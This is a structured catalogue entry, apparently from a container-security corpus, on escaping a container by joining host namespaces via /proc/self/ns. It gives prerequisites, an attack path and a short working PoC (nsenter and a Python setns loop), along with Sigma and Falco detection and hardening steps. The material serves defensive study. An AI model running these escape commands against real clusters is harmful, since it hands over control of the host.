---
id: CE-009
name: Namespace escape via /proc/self/ns
category: kernel/namespaces
mitre_attack: [T1611]
risk: medium
detection_rules: [SIGMA-003, FALCO-003]
---

# CE-009 — Namespace escape via /proc/self/ns

## Summary

Every namespace is a file: `/proc/self/ns/*` and `/proc/<pid>/ns/*` are magic
symlinks whose inode identifies the namespace. With host PID visibility and
`CAP_SYS_ADMIN`, `setns(2)` (or the `nsenter` tool) joins the host's mount, PID,
net, or IPC namespace — after which the "container" process is effectively a
host process.

## Prerequisites

- Host PID namespace visible (`hostPID: true` or host /proc mounted)
- `CAP_SYS_ADMIN` in the target namespaces
- `setns`/`nsenter` not blocked by seccomp

## Attack path

1. Locate host PID 1 (or any host process) via visible `/proc`
2. `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`
3. Now in host namespaces: `mount` host devices, read host `/etc`, reach host
   network services directly
4. Optional: re-enter the container namespace to hide (bind-mount the ns files)

## PoC sketch

```bash
# hostPID pod: PID 1 is the host init
ps -p 1 -o comm=            # -> systemd (host!)

# full namespace join
nsenter -t 1 -m -u -i -n -p bash -c 'hostname; id; ls /'

# via Python setns
python3 - <<'EOF'
import os, ctypes
libc = ctypes.CDLL(None, use_errno=True)
for ns in ("mnt", "uts", "ipc", "net", "pid"):
    fd = os.open(f"/proc/1/ns/{ns}", os.O_RDONLY)
    libc.setns(fd, 0)
EOF
```

The inverse trick — a container process holding an open FD to a host namespace
file and the host later closing its side — is how some runc CVEs (e.g.
CVE-2019-19921) got leverage.

## Detection

- **Logs:** auditd `setns` syscall; kubelet logs for hostPID pods
- **Sigma:** `SIGMA-003` — nsenter/setns usage
- **Falco:** `FALCO-003` — nsenter process spawn
- **Baselines:** `runtime-baseline` captures all 8 namespace inodes; any change
  fires CRITICAL (verified live in this corpus)

## Mitigation

- `hostPID: false` (default-deny)
- Drop `CAP_SYS_ADMIN`; seccomp `setns`
- `hidepid=2` on host `/proc`
- User namespace mapping so root-in-container ≠ root-on-host

## References

- namespaces(7) man page
- CVE-2019-19921 (runc volume path escape)
- MITRE ATT&CK T1611
